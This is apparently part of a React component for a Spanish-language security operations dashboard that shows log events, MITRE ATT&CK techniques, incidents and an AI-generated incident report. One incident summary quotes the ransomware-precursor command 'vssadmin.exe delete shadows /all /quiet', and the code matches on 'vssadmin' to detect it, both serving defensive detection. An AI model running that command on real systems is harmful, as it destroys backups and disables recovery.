                  <div onClick={() => setSelectedMetricModal('critical')} className="bg-[#081324] border border-[#142848] hover:border-cyan-500/50 p-5 rounded-xl space-y-1 shadow-lg cursor-pointer transition transform hover:-translate-y-0.5 group">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-400 text-xs font-mono">Eventos Críticos</span>
                      <Eye className="w-3.5 h-3.5 text-slate-500 group-hover:text-cyan-400" />
                    </div>
                    <div className="text-2xl font-extrabold text-red-400 font-mono">{metrics.critical}</div>
                    <span className="text-[11px] text-slate-400 block">Ver desglose forense →</span>
                  </div>

                  <div onClick={() => setSelectedMetricModal('high_med')} className="bg-[#081324] border border-[#142848] hover:border-cyan-500/50 p-5 rounded-xl space-y-1 shadow-lg cursor-pointer transition transform hover:-translate-y-0.5 group">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-400 text-xs font-mono">Eventos Altos / Medios</span>
                      <Eye className="w-3.5 h-3.5 text-slate-500 group-hover:text-cyan-400" />
                    </div>
                    <div className="text-2xl font-extrabold text-amber-400 font-mono">{metrics.high + metrics.medium}</div>
                    <span className="text-[11px] text-slate-400 block">Inspeccionar registros →</span>
                  </div>

                  <div onClick={() => setSelectedMetricModal('hosts')} className="bg-[#081324] border border-[#142848] hover:border-cyan-500/50 p-5 rounded-xl space-y-1 shadow-lg cursor-pointer transition transform hover:-translate-y-0.5 group">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-400 text-xs font-mono">Hosts Afectados</span>
                      <Eye className="w-3.5 h-3.5 text-slate-500 group-hover:text-cyan-400" />
                    </div>
                    <div className="text-2xl font-extrabold text-cyan-400 font-mono">
                      {Array.from(new Set(logs.map(l => l.host))).length}
                    </div>
                    <span className="text-[11px] text-slate-400 block">Ver servidores/equipos →</span>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="bg-[#081324] border border-[#142848] p-5 rounded-xl space-y-3 shadow-lg">
                    <h3 className="text-xs font-bold text-white font-mono flex items-center gap-2">
                      <Grid className="w-4 h-4 text-cyan-400" /> TÉCNICAS MITRE ATT&CK DETECTADAS
                    </h3>
                    <div className="flex flex-wrap gap-2">
                      {Array.from(new Set(logs.map(l => l.mitre_id))).map((id, idx) => (
                        <button key={idx} onClick={() => setSelectedMitre(id)} className="bg-[#0c1f3c] hover:bg-[#14325c] text-cyan-300 border border-cyan-700/50 px-3 py-1.5 rounded-md text-xs font-mono flex items-center space-x-1 transition">
                          <span>{id}</span>
                          <ChevronRight className="w-3 h-3 text-cyan-400" />
                        </button>
                      ))}
                    </div>
                  </div>

                  <div className="bg-[#081324] border border-[#142848] p-5 rounded-xl space-y-3 shadow-lg">
                    <h3 className="text-xs font-bold text-white font-mono flex items-center gap-2">
                      <Activity className="w-4 h-4 text-cyan-400" /> CATEGORÍAS IDENTIFICADAS
                    </h3>
                    <div className="flex flex-wrap gap-2">
                      {Array.from(new Set(logs.map(l => l.event_type))).map((cat, idx) => (
                        <button key={idx} onClick={() => { setCategoryFilter(cat); setActiveTab('events'); }} className="bg-[#0c1f3c] hover:bg-[#14325c] text-cyan-300 border border-cyan-700/50 px-3 py-1.5 rounded-md text-xs font-mono flex items-center space-x-1 transition">
                          <span>{cat}</span>
                          <Search className="w-3 h-3 text-cyan-400" />
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              </>
            )}
          </div>
        )}

        {activeTab === 'events' && (
          <div className="space-y-4">
            <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 border-b border-[#142642] pb-4">
              <div>
                <h1 className="text-xl font-bold text-white font-mono tracking-tight">EXPLORADOR DE EVENTOS</h1>
              </div>
              <div className="flex flex-wrap items-center gap-3 w-full md:w-auto">
                <div className="relative flex-1 md:w-56">
                  <Search className="w-4 h-4 absolute left-3 top-2.5 text-slate-500" />
                  <input type="text" placeholder="Buscar IP, Host, User..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} className="bg-[#081324] border border-[#142848] text-xs rounded-lg pl-9 pr-3 py-2 text-slate-200 w-full focus:outline-none focus:border-cyan-400" />
                </div>
                <select value={severityFilter} onChange={(e) => setSeverityFilter(e.target.value)} className="bg-[#081324] border border-[#142848] text-xs rounded-lg px-3 py-2 text-slate-300 focus:outline-none">
                  <option value="ALL">Severidad: Todas</option>
                  <option value="Crítico">Crítico</option>
                  <option value="Alto">Alto</option>
                  <option value="Medio">Medio</option>
                </select>
              </div>
            </div>

            <div className="bg-[#081324] border border-[#142848] rounded-xl overflow-hidden shadow-xl">
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs text-slate-300">
                  <thead className="bg-[#050d1a] text-slate-400 font-mono uppercase text-[11px] border-b border-[#142848]">
                    <tr>
                      <th className="p-3">ID</th>
                      <th className="p-3">Timestamp</th>
                      <th className="p-3">Host / Usuario</th>
                      <th className="p-3">Origen → Destino</th>
                      <th className="p-3">Categoría</th>
                      <th className="p-3">Severidad</th>
                      <th className="p-3">MITRE</th>
                      <th className="p-3">Detalle</th>
                      <th className="p-3 text-center">Acción</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#142848] font-mono text-xs">
                    {filteredLogs.length === 0 ? (
                      <tr>
                        <td colSpan="9" className="p-8 text-center text-slate-500">No se encontraron registros.</td>
                      </tr>
                    ) : (
                      filteredLogs.map((l) => (
                        <tr key={l.id} onClick={() => setSelectedLog(l)} className="hover:bg-[#0b1b33] cursor-pointer transition group">
                          <td className="p-3 text-slate-500">#{l.id}</td>
                          <td className="p-3 text-slate-400 whitespace-nowrap">{l.timestamp}</td>
                          <td className="p-3 text-white font-semibold">{l.host} ({l.user})</td>
                          <td className="p-3 text-cyan-400 whitespace-nowrap">{l.src_ip} → {l.dst_ip}</td>
                          <td className="p-3 text-slate-300">{l.event_type}</td>
                          <td className="p-3">
                            <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                              l.severity === 'Crítico' ? 'bg-red-950 text-red-400 border border-red-800' :
                              l.severity === 'Alto' ? 'bg-amber-950 text-amber-400 border border-amber-800' :
                              'bg-cyan-950 text-cyan-400 border border-cyan-800'
                            }`}>
                              {l.severity}
                            </span>
                          </td>
                          <td className="p-3 text-cyan-300 font-bold">{l.mitre_id}</td>
                          <td className="p-3 text-slate-300 font-sans max-w-xs truncate">{l.summary}</td>
                          <td className="p-3 text-center">
                            <button className="px-2 py-1 bg-[#0e2444] hover:bg-cyan-600 text-cyan-300 hover:text-white rounded text-[10px] transition">Inspeccionar</button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'incidents' && (
          <div className="space-y-4">
            <div className="border-b border-[#142642] pb-4">
              <h1 className="text-xl font-bold text-white font-mono tracking-tight">GESTIÓN DE INCIDENTES</h1>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {logs.length === 0 ? (
                <div className="bg-[#081324] border border-[#142848] rounded-xl p-8 text-center text-slate-400 font-mono text-xs col-span-2">
                  Sin incidentes detectados.
                </div>
              ) : (
                <>
                  <div onClick={() => setSelectedIncident({ id: 'INC-2026-001', title: 'Escalamiento de Privilegios y Movimiento Lateral', status: 'EN INVESTIGACIÓN', severity: 'Crítico', affectedCount: logs.length, hosts: Array.from(new Set(logs.map(l => l.host))).join(', '), users: Array.from(new Set(logs.map(l => l.user))).join(', '), summary: 'Secuencia correlacionada de accesos remotos tipo 3 desde IPs sospechosas, seguida de ejecución de scripts PowerShell no firmados y movimiento SMB.' })} className="bg-[#081324] border border-[#142848] hover:border-cyan-500/60 rounded-xl p-6 space-y-4 shadow-xl cursor-pointer transition">
                    <div className="flex justify-between items-center border-b border-[#142848] pb-3">
                      <div className="flex items-center space-x-2"><AlertTriangle className="w-5 h-5 text-red-400" /><span className="font-mono text-sm font-bold text-white">INC-2026-001</span></div>
                      <span className="px-3 py-1 bg-red-950 text-red-400 border border-red-800 rounded text-xs font-mono font-bold">CRÍTICO</span>
                    </div>
                    <h3 className="text-sm font-bold text-cyan-300 font-mono">Escalamiento y Movimiento Lateral</h3>
                    <p className="text-xs text-slate-300 font-sans leading-relaxed">Se detectó compromiso de credenciales y desplazamiento entre nodos ({Array.from(new Set(logs.map(l => l.host))).slice(0, 3).join(', ')}).</p>
                    <div className="text-xs text-cyan-400 font-mono flex items-center justify-between pt-2 border-t border-[#142848]"><span>Abrir Expediente</span><ChevronRight className="w-4 h-4" /></div>
                  </div>

                  <div onClick={() => setSelectedIncident({ id: 'INC-2026-002', title: 'Destrucción de Copias Shadow (Precursor Ransomware)', status: 'CONTENIDO', severity: 'Crítico', affectedCount: logs.filter(l => l.mitre_id === 'T1490' || l.process.includes('vssadmin')).length || 1, hosts: logs.find(l => l.mitre_id === 'T1490')?.host || 'DB-SRV-02', users: 'SYSTEM', summary: 'Ejecución del comando vssadmin.exe delete shadows /all /quiet con la intención de inhabilitar la recuperación del sistema previo al cifrado.' })} className="bg-[#081324] border border-[#142848] hover:border-cyan-500/60 rounded-xl p-6 space-y-4 shadow-xl cursor-pointer transition">
                    <div className="flex justify-between items-center border-b border-[#142848] pb-3">
                      <div className="flex items-center space-x-2"><ServerCrash className="w-5 h-5 text-amber-400" /><span className="font-mono text-sm font-bold text-white">INC-2026-002</span></div>
                      <span className="px-3 py-1 bg-amber-950 text-amber-400 border border-amber-800 rounded text-xs font-mono font-bold">ALTO</span>
                    </div>
                    <h3 className="text-sm font-bold text-cyan-300 font-mono">Inhibición de Recuperación de Sistema</h3>
                    <p className="text-xs text-slate-300 font-sans leading-relaxed">Invocación directa de herramientas de gestión de volumen para borrar copias de seguridad.</p>
                    <div className="text-xs text-cyan-400 font-mono flex items-center justify-between pt-2 border-t border-[#142848]"><span>Abrir Expediente</span><ChevronRight className="w-4 h-4" /></div>
                  </div>
                </>
              )}
            </div>
          </div>
        )}

        {activeTab === 'mitre' && (
          <div className="space-y-4">
            <div className="border-b border-[#142642] pb-4">
              <h1 className="text-xl font-bold text-white font-mono tracking-tight">MATRIZ MITRE ATT&CK</h1>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {Array.from(new Set(logs.map(l => l.mitre_id))).map((techniqueId) => {
                const techniqueLogs = logs.filter(l => l.mitre_id === techniqueId);
                const info = mitreDictionary[techniqueId] || { name: 'Técnica Detectada', tactic: 'Execution', description: 'Actividad sospechosa coincidente con marco MITRE.' };
                return (
                  <div key={techniqueId} onClick={() => setSelectedMitre(techniqueId)} className="bg-[#081324] border border-[#142848] hover:border-cyan-500/50 p-5 rounded-xl space-y-3 shadow-xl cursor-pointer transition group flex flex-col justify-between">
                    <div className="space-y-2">
                      <div className="flex justify-between items-center">
                        <span className="font-mono text-sm font-bold text-cyan-400 group-hover:text-cyan-300">{techniqueId}: {info.name}</span>
                        <span className="bg-[#0c1f3c] text-cyan-300 text-[10px] font-mono px-2 py-0.5 rounded border border-cyan-800">{techniqueLogs.length} Evento(s)</span>
                      </div>
                      <span className="text-[10px] font-mono text-amber-400 bg-amber-950/40 px-2 py-0.5 rounded inline-block border border-amber-900/40">Táctica: {info.tactic}</span>
                      <p className="text-xs text-slate-300 font-sans leading-relaxed">{info.description}</p>
                    </div>
                    <div className="text-[11px] text-cyan-400 font-mono flex items-center justify-between pt-3 border-t border-[#142848]"><span>Ver Registros</span><ChevronRight className="w-3.5 h-3.5" /></div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {activeTab === 'timeline' && (
          <div className="space-y-4">
            <div className="border-b border-[#142642] pb-4">
              <h1 className="text-xl font-bold text-white font-mono tracking-tight">TIMELINE CRONOLÓGICO</h1>
            </div>
            <div className="relative border-l border-[#142848] ml-4 space-y-6 pl-6 py-2">
              {logs.map((l, idx) => (
                <div key={l.id} className="relative cursor-pointer group" onClick={() => setSelectedLog(l)}>
                  <div className="absolute -left-[31px] top-1.5 w-3 h-3 rounded-full bg-cyan-400 border-2 border-[#050b14] group-hover:scale-125 transition-transform"></div>
                  <div className="bg-[#081324] border border-[#142848] group-hover:border-cyan-500/50 p-4 rounded-xl space-y-2 shadow-xl transition">
                    <div className="flex items-center justify-between font-mono text-xs text-cyan-400 font-bold"><span>{l.timestamp}</span><span className="text-slate-500">Hito #{idx + 1}</span></div>
                    <h4 className="text-xs font-bold text-white font-mono">{l.event_type} ({l.mitre_id})</h4>
                    <p className="text-xs text-slate-300 font-sans">{l.summary}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'cases' && (
          <div className="space-y-4">
            <div className="border-b border-[#142642] pb-4">
              <h1 className="text-xl font-bold text-white font-mono tracking-tight">CASOS DE INVESTIGACIÓN</h1>
            </div>
            <div onClick={() => setSelectedCase({ id: 'CASO-2026-XDR', title: 'Compromiso de Credenciales y Tentativa de Cifrado en Servidores', status: 'ABIERTO', lead: 'Analista SOC Nivel 2', evidenceCount: logs.length, hosts: Array.from(new Set(logs.map(l => l.host))).join(', '), users: Array.from(new Set(logs.map(l => l.user))).join(', ') })} className="bg-[#081324] border border-[#142848] hover:border-cyan-500/50 rounded-xl p-6 space-y-3 cursor-pointer transition shadow-xl">
              <div className="flex justify-between items-center"><div className="text-xs font-mono text-cyan-400">CASO-2026-XDR</div><span className="px-2.5 py-1 bg-cyan-950 text-cyan-300 border border-cyan-800 rounded text-[10px] font-mono">VER EXPEDIENTE</span></div>
              <div className="text-sm font-bold text-white font-mono">Investigación de Actividad Anómala de Red</div>
              <p className="text-xs text-slate-300">Total registros y evidencias asociadas: <strong>{logs.length}</strong></p>
            </div>
          </div>
        )}

        {activeTab === 'report' && (
          <div className="space-y-6">
            <div className="bg-[#081324] border border-[#142848] rounded-xl p-6 shadow-xl space-y-4">
              <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                <div>
                  <h2 className="text-base font-bold text-white flex items-center gap-2 font-mono"><Sparkles className="w-4 h-4 text-cyan-400" /> GENERADOR DE INFORME EJECUTIVO Y TÉCNICO CON GROQ IA</h2>
                  <p className="text-xs text-slate-400">Crea un reporte con la estructura idéntica a los estándares SOC (SLA, IoCs, Resumen).</p>
                </div>
                <div className="flex items-center space-x-3 w-full sm:w-auto">
                  <button onClick={runAiAnalysis} disabled={isAiGenerating || logs.length === 0} className="flex-1 sm:flex-initial flex items-center justify-center space-x-2 px-5 py-2.5 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded-lg text-xs font-mono shadow-md transition disabled:opacity-50">
                    <Sparkles className="w-4 h-4" /><span>{isAiGenerating ? 'Analizando...' : 'Generar Informe IA'}</span>
                  </button>
                  {aiReportData && (
                    <button onClick={generatePdfReport} disabled={isPdfGenerating} className="flex items-center space-x-2 px-5 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold rounded-lg text-xs font-mono shadow-md transition">
                      <Download className="w-4 h-4" /><span>{isPdfGenerating ? 'Creando PDF...' : 'Descargar Informe PDF'}</span>
                    </button>
                  )}
                </div>
              </div>

              <div className="pt-3 border-t border-[#142848] flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
                <div className="flex items-center space-x-2 text-xs font-mono text-slate-400"><Key className="w-4 h-4 text-cyan-400" /><span>Groq API Key:</span></div>
                <div className="w-full sm:w-80">
                  {import.meta.env.VITE_GROQ_API_KEY ? (
                    <div className="w-full bg-[#040912] border border-emerald-800/50 text-xs rounded px-3 py-1.5 text-emerald-400 font-mono flex items-center space-x-2"><Lock className="w-3.5 h-3.5" /><span>Conectado vía .env de forma segura</span></div>
                  ) : (
                    <input type="password" placeholder="Pegar gsk_... (Opcional)" value={customGroqKey} onChange={(e) => setCustomGroqKey(e.target.value)} className="w-full bg-[#040912] border border-[#142848] text-xs rounded px-3 py-1.5 text-cyan-300 font-mono focus:outline-none focus:border-cyan-400" />
                  )}
                </div>
              </div>
              {aiErrorMessage && (<div className="p-3 bg-amber-950/60 border border-amber-800 text-amber-300 text-xs font-mono rounded">{aiErrorMessage}</div>)}
            </div>

            {aiReportData && (
              <div className="bg-white text-slate-900 rounded-xl p-8 sm:p-12 shadow-2xl space-y-8 max-w-4xl mx-auto font-sans">
                <div className="border-b-2 border-slate-200 pb-6 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                  <div><h1 className="text-2xl font-extrabold text-slate-900 tracking-tight">INFORME DE SEGURIDAD E INCIDENTES</h1><p className="text-xs font-mono text-cyan-700 font-bold uppercase tracking-wider">SOC ANALYZER • Threat Response Unit</p></div>
                  <div className="bg-red-50 border border-red-200 p-3 rounded-lg text-right"><div className="text-[11px] text-slate-500 font-mono">Nivel de Riesgo Global</div><div className="text-lg font-black text-red-600 font-mono">CRÍTICO</div></div>
                </div>

                <div className="space-y-3">
                  <h2 className="text-sm font-bold text-cyan-800 uppercase tracking-wider font-mono border-b border-cyan-100 pb-1">1. Resumen Ejecutivo</h2>
                  <div className="space-y-3 text-xs leading-relaxed text-slate-700">
                    <div><strong className="text-slate-900 block mb-1 font-mono">Contexto y Riesgo:</strong><p>{aiReportData.contextAndRisk}</p></div>
                    <div><strong className="text-slate-900 block mb-1 font-mono">Impacto en el Negocio:</strong><p>{aiReportData.businessImpact}</p></div>
                  </div>
                </div>

                <div className="space-y-3">
                  <h2 className="text-sm font-bold text-cyan-800 uppercase tracking-wider font-mono border-b border-cyan-100 pb-1">2. Análisis Técnico de Amenazas</h2>
                  <div className="space-y-3 text-xs leading-relaxed text-slate-700">
                    <div><strong className="text-slate-900 block mb-1 font-mono">Escalamiento de Privilegios:</strong><p>{aiReportData.threatAnalysisEscalation}</p></div>
                    <div><strong className="text-slate-900 block mb-1 font-mono">Comandos Sospechosos:</strong><p className="whitespace-pre-wrap">{aiReportData.threatAnalysisCommands}</p></div>
                    <div><strong className="text-slate-900 block mb-1 font-mono">Movimiento Lateral:</strong><p>{aiReportData.threatAnalysisLateral}</p></div>
                    <div><strong className="text-slate-900 block mb-1 font-mono">Fuerza Bruta:</strong><p>{aiReportData.threatAnalysisBruteForce}</p></div>
                  </div>
                </div>

                <div className="space-y-3">
                  <h2 className="text-sm font-bold text-cyan-800 uppercase tracking-wider font-mono border-b border-cyan-100 pb-1">3. Matriz de Indicadores de Compromiso (IoCs)</h2>
                  <div className="bg-slate-50 border border-slate-200 p-4 rounded-lg space-y-2 text-xs font-mono text-slate-800">
                    <div><strong>IPs de Origen:</strong> {aiReportData.iocsSrcIPs}</div>
                    <div><strong>IPs de Destino:</strong> {aiReportData.iocsDstIPs}</div>
                    <div><strong>Cuentas Comprometidas:</strong> {aiReportData.iocsUsers}</div>
                    <div><strong>Procesos/Comandos:</strong> {aiReportData.iocsCommands}</div>
                  </div>
                </div>

                <div className="space-y-3">
                  <h2 className="text-sm font-bold text-cyan-800 uppercase tracking-wider font-mono border-b border-cyan-100 pb-1">4. Plan de Remediación y Mitigación</h2>
                  <div className="space-y-3 text-xs font-mono">
                    <div className="bg-white border-l-4 border-red-500 border-y border-r border-slate-200 p-4 rounded-r-lg shadow-sm">
                      <span className="font-bold text-slate-900 block mb-1">Acciones Inmediatas (SLA &lt; 1 hora)</span>
                      <p className="text-slate-700 whitespace-pre-wrap font-sans">{aiReportData.slaImmediate}</p>
                    </div>
                    <div className="bg-white border-l-4 border-amber-500 border-y border-r border-slate-200 p-4 rounded-r-lg shadow-sm">
                      <span className="font-bold text-slate-900 block mb-1">Acciones a Corto Plazo (SLA &lt; 24 horas)</span>
                      <p className="text-slate-700 whitespace-pre-wrap font-sans">{aiReportData.slaShortTerm}</p>
                    </div>
                    <div className="bg-white border-l-4 border-cyan-500 border-y border-r border-slate-200 p-4 rounded-r-lg shadow-sm">
                      <span className="font-bold text-slate-900 block mb-1">Acciones a Mediano Plazo (SLA &lt; 1 semana)</span>
                      <p className="text-slate-700 whitespace-pre-wrap font-sans">{aiReportData.slaMediumTerm}</p>
                    </div>
                  </div>
                </div>

                <div className="pt-6 border-t border-slate-200 text-center text-[10px] text-slate-400 font-mono">Documento generado automáticamente por SOC Analyzer • Confidencial</div>
              </div>
            )}
          </div>
        )}

      </main>

      {/* MODALES */}
      {selectedLog && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#081324] border border-cyan-500/40 rounded-xl max-w-2xl w-full p-6 space-y-4 shadow-2xl relative font-mono text-xs">
            <button onClick={() => setSelectedLog(null)} className="absolute right-4 top-4 text-slate-400 hover:text-white"><X className="w-5 h-5" /></button>
            <div className="flex items-center space-x-2 text-cyan-400 font-bold border-b border-[#142848] pb-3"><FileCode className="w-5 h-5" /><span className="text-sm">INSPECTOR FORENSE: REGISTRO #{selectedLog.id}</span></div>
            <div className="grid grid-cols-2 gap-3 text-slate-300">
              <div><strong className="text-slate-500">Timestamp:</strong> {selectedLog.timestamp}</div>
              <div><strong className="text-slate-500">Host Afectado:</strong> {selectedLog.host}</div>
              <div><strong className="text-slate-500">Usuario:</strong> {selectedLog.user}</div>
              <div><strong className="text-slate-500">Origen/Destino:</strong> {selectedLog.src_ip} → {selectedLog.dst_ip}</div>
              <div><strong className="text-slate-500">Técnica MITRE:</strong> <span className="text-cyan-400">{selectedLog.mitre_id}</span></div>
              <div><strong className="text-slate-500">Severidad:</strong> <span className="text-red-400">{selectedLog.severity}</span></div>
            </div>
            <div className="space-y-1"><span className="text-slate-400 font-bold">Proceso Ejecutado:</span><div className="bg-[#040912] p-2.5 rounded border border-[#142848] text-cyan-300 font-mono break-all">{selectedLog.process}</div></div>
            <div className="space-y-1"><span className="text-slate-400 font-bold">Payload Raw (JSON):</span><pre className="bg-[#040912] p-3 rounded border border-[#142848] text-slate-300 text-[11px] overflow-x-auto max-h-48">{selectedLog.raw_payload}</pre></div>
            <div className="pt-2 flex justify-end"><button onClick={() => setSelectedLog(null)} className="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded">Cerrar Inspector</button></div>
          </div>
        </div>
      )}

      {selectedMitre && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#081324] border border-cyan-500/40 rounded-xl max-w-xl w-full p-6 space-y-4 shadow-2xl relative font-mono text-xs">
            <button onClick={() => setSelectedMitre(null)} className="absolute right-4 top-4 text-slate-400 hover:text-white"><X className="w-5 h-5" /></button>
            <div className="flex items-center space-x-2 text-cyan-400 font-bold border-b border-[#142848] pb-3"><Grid className="w-5 h-5" /><span className="text-sm">FICHA MITRE ATT&CK: {selectedMitre}</span></div>
            <div className="space-y-2 text-slate-300">
              <p><strong className="text-cyan-400">Nombre:</strong> {mitreDictionary[selectedMitre]?.name || 'Técnica Detectada'}</p>
              <p><strong className="text-amber-400">Táctica:</strong> {mitreDictionary[selectedMitre]?.tactic || 'Ejecución'}</p>
              <p><strong className="text-cyan-400">Descripción:</strong> {mitreDictionary[selectedMitre]?.description}</p>
              <p><strong className="text-cyan-400">Eventos Asociados:</strong> {logs.filter(l => l.mitre_id === selectedMitre).length} registro(s).</p>
            </div>
            <div className="pt-2 flex justify-end"><button onClick={() => setSelectedMitre(null)} className="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded">Cerrar Ficha</button></div>
          </div>
        </div>
      )}

      {selectedMetricModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#081324] border border-cyan-500/40 rounded-xl max-w-lg w-full p-6 space-y-4 shadow-2xl relative font-mono text-xs">
            <button onClick={() => setSelectedMetricModal(null)} className="absolute right-4 top-4 text-slate-400 hover:text-white"><X className="w-5 h-5" /></button>
            <div className="flex items-center space-x-2 text-cyan-400 font-bold border-b border-[#142848] pb-3"><Info className="w-5 h-5" /><span className="text-sm">DESGLOSE DE MÉTRICA: {selectedMetricModal.toUpperCase()}</span></div>
            <div className="space-y-3 text-slate-300">
              {selectedMetricModal === 'hosts' && (
                <div>
                  <span className="font-bold text-white block mb-2">Servidores y Equipos Comprometidos:</span>
                  <ul className="list-disc pl-5 space-y-1">{Array.from(new Set(logs.map(l => l.host))).map((h, i) => (<li key={i} className="text-cyan-300">{h}</li>))}</ul>
                </div>
              )}
            </div>
            <div className="pt-2 flex justify-end"><button onClick={() => setSelectedMetricModal(null)} className="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded">Cerrar</button></div>
          </div>
        </div>
      )}

      {selectedIncident && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#081324] border border-red-500/40 rounded-xl max-w-xl w-full p-6 space-y-4 shadow-2xl relative font-mono text-xs">
            <button onClick={() => setSelectedIncident(null)} className="absolute right-4 top-4 text-slate-400 hover:text-white"><X className="w-5 h-5" /></button>
            <div className="flex items-center space-x-2 text-red-400 font-bold border-b border-[#142848] pb-3"><AlertTriangle className="w-5 h-5" /><span className="text-sm">EXPEDIENTE INCIDENTE #{selectedIncident.id}</span></div>
            <div className="space-y-3 text-slate-300">
              <p><strong className="text-white">Título:</strong> {selectedIncident.title}</p>
              <p><strong className="text-white">Estado:</strong> <span className="text-red-400 font-bold">{selectedIncident.status}</span></p>
              <p><strong className="text-white">Hosts Afectados:</strong> {selectedIncident.hosts}</p>
              <p><strong className="text-white">Usuarios Involucrados:</strong> {selectedIncident.users}</p>
              <div className="bg-[#040912] p-3 rounded border border-[#142848]"><strong className="text-cyan-400 block mb-1">Evidencia Correlacionada:</strong><p className="text-slate-300 leading-relaxed font-sans text-xs">{selectedIncident.summary}</p></div>
            </div>
            <div className="pt-2 flex justify-end"><button onClick={() => setSelectedIncident(null)} className="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded">Cerrar</button></div>
          </div>
        </div>
      )}

      {selectedCase && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#081324] border border-cyan-500/40 rounded-xl max-w-xl w-full p-6 space-y-4 shadow-2xl relative font-mono text-xs">
            <button onClick={() => setSelectedCase(null)} className="absolute right-4 top-4 text-slate-400 hover:text-white"><X className="w-5 h-5" /></button>
            <div className="flex items-center space-x-2 text-cyan-400 font-bold border-b border-[#142848] pb-3"><Briefcase className="w-5 h-5" /><span className="text-sm">CUSTODIA DE CASO: {selectedCase.id}</span></div>
            <div className="space-y-3 text-slate-300">
              <p><strong className="text-white">Título de Investigación:</strong> {selectedCase.title}</p>
              <p><strong className="text-white">Analista Encargado:</strong> {selectedCase.lead}</p>
              <p><strong className="text-white">Evidencias Totales:</strong> {selectedCase.evidenceCount} registros</p>
              <p><strong className="text-white">Equipos en Observación:</strong> {selectedCase.hosts}</p>
            </div>
            <div className="pt-2 flex justify-end"><button onClick={() => setSelectedCase(null)} className="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded">Cerrar</button></div>
          </div>
        </div>
      )}

    </div>
  );
}